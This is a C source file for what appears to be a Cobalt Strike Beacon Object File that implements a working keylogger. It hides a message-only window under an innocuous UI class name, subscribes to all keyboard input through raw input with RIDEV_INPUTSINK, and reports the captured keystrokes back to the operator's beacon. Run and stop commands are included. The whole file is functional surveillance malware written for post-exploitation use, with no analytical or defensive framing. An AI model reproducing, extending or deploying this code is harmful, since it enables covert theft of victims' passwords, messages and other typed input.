#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "keyloggerrawinput.h"
#include "beacon.h"

#pragma comment(lib, "user32.lib")


// Maximum buffer size for captured input
#define MAX_BUF 65536
static char *inputBuf = NULL;
static size_t bufPos = 0;
static HWND g_hwnd = NULL;


LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_INPUT) {
        if (!inputBuf) {
            return 0;
        }
        UINT size = 0;
        USER32$GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &size, sizeof(RAWINPUTHEADER));
        if (size == 0) return 0;

        LPBYTE data = MSVCRT$malloc(size);
        if (!data) return 0;
        if (USER32$GetRawInputData((HRAWINPUT)lParam, RID_INPUT, data, &size, sizeof(RAWINPUTHEADER)) == size) {
            RAWINPUT *raw = (RAWINPUT*)data;
            if (raw->header.dwType == RIM_TYPEKEYBOARD) {
                USHORT vkey = raw->data.keyboard.VKey;
                USHORT msgk = raw->data.keyboard.Message;
                if (msgk == WM_KEYDOWN || msgk == WM_SYSKEYDOWN) {
                    if (vkey == VK_BACK) {
                        const char *bs = "[BACKSPACE]";
                        size_t len = MSVCRT$strlen(bs);
                        if (bufPos + len < MAX_BUF - 1) {
                            MSVCRT$memcpy(inputBuf + bufPos, bs, len);
                            bufPos += len;
                        }
					} else if (vkey == VK_RETURN) {
                        const char *ent = "[ENTER]";
                        size_t len = MSVCRT$strlen(ent);
                        if (bufPos + len < MAX_BUF - 1) {
                            MSVCRT$memcpy(inputBuf + bufPos, ent, len);
                            bufPos += len;
                        }
                    } else if (vkey == VK_SPACE) {
                        if (bufPos < MAX_BUF - 1) {
                            inputBuf[bufPos++] = ' ';
                        }
                    } else {
                        BYTE kbState[256];
                        USER32$GetKeyboardState(kbState);
                        WORD ch = 0;
                        int ret = USER32$ToAscii(vkey, raw->data.keyboard.MakeCode, kbState, &ch, 0);
                        if (ret == 1 && ch >= 32 && ch <= 126) {
                            if (bufPos < MAX_BUF - 1) {
                                inputBuf[bufPos++] = (char)ch;
                            }
                        }
                    }
                }
            }
        }
        MSVCRT$free(data);
        return 0;
    }
    if (msg == WM_DESTROY) {
        USER32$PostQuitMessage(0);
        return 0;
    }
    return USER32$DefWindowProcA(hwnd, msg, wParam, lParam);
}


int go(char *args, int len) {
	datap parser;
    CHAR *cmd = "";
	BeaconDataParse(&parser, args, len);
	cmd = BeaconDataExtract(&parser, NULL);
	

    if (MSVCRT$strcmp(cmd, "run") == 0) {
		inputBuf = MSVCRT$malloc(MAX_BUF);
		if (!inputBuf) {
			BeaconPrintf(CALLBACK_OUTPUT, "Failed to allocate buffer\n");
			return 1;
		}
		MSVCRT$memset(inputBuf, 0, MAX_BUF);
		bufPos = 0;
		
	    // Register a dummy window class so Windows knows how to route messages to WndProc. 
		HINSTANCE hInstance = KERNEL32$GetModuleHandleA(NULL);
		const char CLASS_NAME[] = "Application-level-UIA-InputClass";
		WNDCLASS wc = {0};
		wc.lpfnWndProc   = WndProc;
		wc.hInstance     = hInstance;
		wc.lpszClassName = CLASS_NAME;
		
		if (!USER32$GetClassInfoA(hInstance, CLASS_NAME, &wc)) {
			if (!USER32$RegisterClassA(&wc)) {
				BeaconPrintf(CALLBACK_OUTPUT, "RegisterClass failed: %lu\n", KERNEL32$GetLastError());
				MSVCRT$free(inputBuf);
				inputBuf = NULL;
				return 1;
			}
		}

		// Create a *message-only* window (HWND_MESSAGE) that never appears on-screen
		if (g_hwnd) {
			RAWINPUTDEVICE rid_cleanup = {0};
			rid_cleanup.usUsagePage = 0x01;
			rid_cleanup.usUsage = 0x06;
			rid_cleanup.dwFlags = RIDEV_REMOVE;
			rid_cleanup.hwndTarget = g_hwnd;
			USER32$RegisterRawInputDevices(&rid_cleanup, 1, sizeof(rid_cleanup));
			USER32$DestroyWindow(g_hwnd);
			g_hwnd = NULL;
		}

		g_hwnd = USER32$CreateWindowExA(0, CLASS_NAME, "Application-level-UIA", 0,0,0,0,0, HWND_MESSAGE, NULL, hInstance, NULL);
		if (!g_hwnd) {
			BeaconPrintf(CALLBACK_OUTPUT, "CreateWindowEx failed\n");
			MSVCRT$free(inputBuf);
			inputBuf = NULL;
			return 1;
		}

		// Call RegisterRawInputDevices to subscribe to *all* keyboard input (RIDEV_INPUTSINK)
		RAWINPUTDEVICE rid = {0};
		rid.usUsagePage = 0x01;
		rid.usUsage     = 0x06;
		rid.dwFlags     = RIDEV_INPUTSINK;
		rid.hwndTarget  = g_hwnd;
		if (!USER32$RegisterRawInputDevices(&rid, 1, sizeof(rid))) {
			BeaconPrintf(CALLBACK_OUTPUT, "RegisterRawInputDevices failed\n");
			MSVCRT$free(inputBuf);
			inputBuf = NULL;
			return 1;
		}
		
		// Process and dispatch all pending Windows messages from the internal raw-input buffer and sending them to WndProc
		MSG msg;
		while (USER32$PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE)) {
			USER32$TranslateMessage(&msg);
			USER32$DispatchMessageA(&msg);
		}
		
		if (bufPos > 0) {
			BeaconPrintf(CALLBACK_OUTPUT, "[+] CAPTURED KEYSTROKES:\n================================================================================================================\n\n%s\n", inputBuf);
		} else {
			BeaconPrintf(CALLBACK_OUTPUT, "[*] Keylogger is running.. no keystrokes captured jet.\n");
		}

		MSVCRT$free(inputBuf);
		inputBuf = NULL;
		bufPos = 0;
	}
	else if (MSVCRT$strcmp(cmd, "stop") == 0) {
        if (g_hwnd) {
            RAWINPUTDEVICE rid_remove = {0};
            rid_remove.usUsagePage = 0x01;
            rid_remove.usUsage = 0x06;
            rid_remove.dwFlags = RIDEV_REMOVE;
            rid_remove.hwndTarget = g_hwnd;
            USER32$RegisterRawInputDevices(&rid_remove, 1, sizeof(rid_remove));
            USER32$DestroyWindow(g_hwnd);
            g_hwnd = NULL;
        }

        if (inputBuf) {
            MSVCRT$free(inputBuf);
            inputBuf = NULL;
        }
		bufPos = 0;
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Keylogger stopped\n");
        return 0;
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "Unknown command. Use [run] or [stop].\n");
        return 1;
    }
	
    return 0;
}

